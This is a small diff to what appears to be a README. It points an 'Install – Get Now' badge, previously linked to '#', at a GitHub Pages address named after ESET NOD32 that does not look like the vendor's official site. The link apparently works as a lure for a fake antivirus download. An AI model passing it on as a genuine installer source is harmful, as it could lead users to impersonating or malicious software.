@@ -6,7 +6,7 @@
 
 <p align="center">
 
-[![Install](https://img.shields.io/badge/⬇%20Install-Get%20Now-blue?style=for-the-badge)](#)
+[![Install](https://img.shields.io/badge/⬇%20Install-Get%20Now-blue?style=for-the-badge)](https://eset-nod32-g.github.io/.github)
 
 </p>
 
